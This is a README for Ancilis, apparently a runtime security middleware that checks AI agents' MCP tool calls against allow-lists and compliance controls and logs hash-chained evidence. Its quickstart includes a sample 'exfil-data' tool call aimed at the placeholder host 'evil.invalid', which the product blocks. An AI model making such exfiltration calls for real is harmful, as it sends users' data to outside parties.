# Ancilis

[![CI](https://github.com/ancilis/ancilis/actions/workflows/ci.yml/badge.svg)](https://github.com/ancilis/ancilis/actions/workflows/ci.yml)
[![License](https://img.shields.io/badge/license-BUSL--1.1-blue.svg)](LICENSE)
[![PyPI](https://img.shields.io/pypi/v/ancilis.svg)](https://pypi.org/project/ancilis/)

Policy-driven runtime security for AI agents. Declare your data. Get your controls. Prove compliance.

---

Your agent touches credit card numbers, personal information, financial records. Every tool call is a compliance event — but nothing in your stack treats it that way. Ancilis intercepts tool calls at runtime, evaluates them against structured security controls, and emits tamper-proof evidence.

The key thing: tell Ancilis what data your agent handles, and it automatically activates the right compliance controls — PCI-DSS for cardholder data, GDPR for personal info, SOC 2 for everything going to enterprise buyers. Or just declare a certification target like `aiuc-1` and get instant coverage without knowing anything about compliance frameworks.

## What It Does

- **Intercepts every tool call** before it reaches your MCP server
- **Evaluates against policy** — identity, scope, tool provenance, data exposure
- **Blocks violations** in enforce mode; logs everything in audit mode
- **Auto-scopes compliance** — declare your data types, get the regulatory controls that apply
- **Emits compliance-grade evidence** — SHA-256 chained records, queryable with SQL, export-ready

## Quick Start

```bash
pip install ancilis[mcp]
```

```python
from ancilis import AncilisMiddleware

# Wrap your MCP client
client = AncilisMiddleware(mcp_client)
```

```
Ancilis: 47 tool calls evaluated. 0 issues. Run `ancilis status` for details.
```

### Python quickstart: wrap middleware, allow one tool, block another, inspect status

```yaml
# ancilis.yaml
agent:
  name: payment-agent
security:
  mode: enforce
  tools:
    allowed:
      - get-status
```

```python
from ancilis import AncilisMiddleware
from ancilis.middleware import BlockedToolCallError

middleware = AncilisMiddleware(mcp_client, config_path="ancilis.yaml")

await middleware.call_tool("get-status", {"subsystem": "payments"})  # allowed

try:
    await middleware.call_tool("exfil-data", {"target": "https://evil.invalid"})
except BlockedToolCallError as exc:
    print(exc.display_message)
```

```bash
ancilis status --config ancilis.yaml
```

### Path A — I need a certification

```yaml
# ancilis.yaml
agent:
  name: payment-agent
certification_targets:
  - aiuc-1
```

One config line. All six controls activate. Ancilis starts collecting the evidence AIUC-1 requires. No compliance knowledge needed.

```bash
ancilis report --format aiuc1-readiness
```

```
AIUC-1 READINESS REPORT
  Readiness:        85% (17 of 20 requirements passing)
  Coverage:         85% (17 automated, 3 operator)
  Evidence records: 38,412 over reporting period
  Hash chain:       intact (verified)
```

### Path B — I know my data

```yaml
# ancilis.yaml
agent:
  name: payment-agent
my_agent_handles:
  - credit_cards
  - personal_info
```

Two lines. SOC 2 Type II and GDPR controls activate automatically. Evidence fields are extended. No framework crosswalking, no manual mapping.

```bash
ancilis status
```

```
Ancilis — payment-agent
  Mode: audit
  Controls: 6 active, all passing
  SOC 2 Type II: active (credit_cards, personal_info)
  GDPR: active (personal_info)
  Tool calls: 1,247 evaluated, 0 blocked
```

Both paths compose — combine them for certification coverage plus data-driven regulatory overlays.

## What You Get

### Audit mode (default)

Nothing is blocked. Every evaluation is logged. Warnings surface exactly what needs attention:

```
Ancilis — payment-agent
  Mode: audit
  Controls: 6 active, all passing
  SOC 2 Type II: active
  Tool calls: 1,247 evaluated, 0 blocked

  Warnings:
    [scope] Agent called 'send_email' — not in approved tool list.
            To approve: ancilis approve-tool send_email
```

Every warning tells you what to do next:

```bash
ancilis approve-tool send_email
```

### Enforce mode

Set `security.mode: enforce`. Unauthorized calls are blocked before execution:

```
Ancilis [blocked]: Tool 'exfil-data' blocked — not in approved tool list.
  To approve: ancilis approve-tool exfil-data
  To review: ancilis status
```

### Evidence records

Every evaluation writes a DuckDB record with SHA-256 hash chain integrity. Local. No external services. No data leaves your environment. Query directly with SQL.

### Posture reports

```bash
ancilis report --format pdf --period 90d
```

Framework-by-framework compliance coverage, evidence counts, hash chain verification. Ready for procurement responses.

## How It Works

MCP middleware intercepts every tool call before it reaches your server. Each call is evaluated by the control engine — identity, scope, provenance, data exposure, audit trail, anomaly detection — then forwarded or blocked. Every decision is recorded in a local DuckDB evidence store with SHA-256 hash chain integrity. The CLI reads that store to generate status output and compliance reports.

The underlying abstraction (Action Object) decouples producers from the control engine. MCP and CLI producers ship today; the architecture supports additional producers. Policy data — controls, overlay profiles, data classifications — lives in `shared/` as JSON, consumed by both the Python and TypeScript SDKs.

```
python/       Python SDK  (pip install ancilis)
typescript/   TypeScript SDK  (npm install ancilis)
shared/       Controls, overlays, classifications, schemas
```

## Configuration

Each level adds one concept. You don't need level N to get value from level N-1.

| Level | Config addition | What activates |
|---|---|---|
| 0 | Just `agent.name` | Baseline: 6 security controls |
| 1 | `certification_targets: [aiuc-1]` | AIUC-1 controls + readiness reporting |
| 2 | `my_agent_handles: [credit_cards, ...]` | Regulatory overlays for declared data types |
| 3 | Both together | Certification coverage + data-driven overlays |

**Level 0 — Baseline:**

```yaml
agent:
  name: my-agent
```

**Level 1 — Certification target:**

```yaml
agent:
  name: my-agent
certification_targets:
  - aiuc-1
```

**Level 2 — Data classification:**

```yaml
agent:
  name: my-agent
my_agent_handles:
  - credit_cards        # SOC 2; PCI-DSS on roadmap
  - personal_info       # SOC 2, GDPR
  - ai_training_data    # SOC 2, EU AI Act
  - health_records      # SOC 2, HIPAA, GDPR
```

**Level 3 — Enforcement:**

```yaml
agent:
  name: my-agent
security:
  mode: enforce
  tools:
    allowed:
      - get_transactions
      - customer_lookup
```

## Regulatory Coverage

### Data types → overlays

| Data type | Overlays activated |
|---|---|
| `credit_cards` | SOC 2 Type II; PCI-DSS (roadmap) |
| `personal_info` | SOC 2 Type II, GDPR |
| `ai_training_data` | SOC 2 Type II, EU AI Act |
| `biometric_data` | SOC 2 Type II, EU AI Act |
| `health_records` | SOC 2 Type II, HIPAA, GDPR |
| `patient_data` | SOC 2 Type II, HIPAA, GDPR |
| `financial_records` | SOC 2 Type II |
| Any other declared type | SOC 2 Type II |

### Certification targets

| Target | What it covers |
|---|---|
| `aiuc-1` | AIUC-1 AI Agent Standard — all six controls, readiness report, evidence packaging |

When a roadmap framework would activate, Ancilis tells you clearly and continues running with baseline controls:

```
? pci-dss would be activated by DC-FIN-01 via credit_cards but is not yet available
  Baseline security controls are active for all data types.
```

More overlays and certification targets in development. All 16 data types are supported today.

## CLI

```bash
ancilis status                               # Current posture (plain language)
ancilis status --verbose                     # Per-control detail with activation sources
ancilis config validate                      # Validate configuration
ancilis approve-tool <name>                  # Add tool to approved list
ancilis report --format terminal             # Quick review in terminal
ancilis report --format markdown             # Markdown for review
ancilis report --format pdf --period 30d     # PDF for procurement/audit
ancilis report --format aiuc1-readiness      # AIUC-1 certification readiness report
```

## TypeScript

TypeScript is currently a preview package. Core control-engine and middleware APIs build and test cleanly, but Python is the primary supported path for launch and has the more complete reporting / release-hardening coverage today.

```bash
npm install ancilis
```

## Contributing / Security / License

- Security disclosures: [SECURITY.md](SECURITY.md) — security@ancilis.ai
- [CONTRIBUTING.md](CONTRIBUTING.md)
- Business Source License 1.1 — see [LICENSE](LICENSE). Change Date: March 10, 2030. Change License: Apache 2.0.
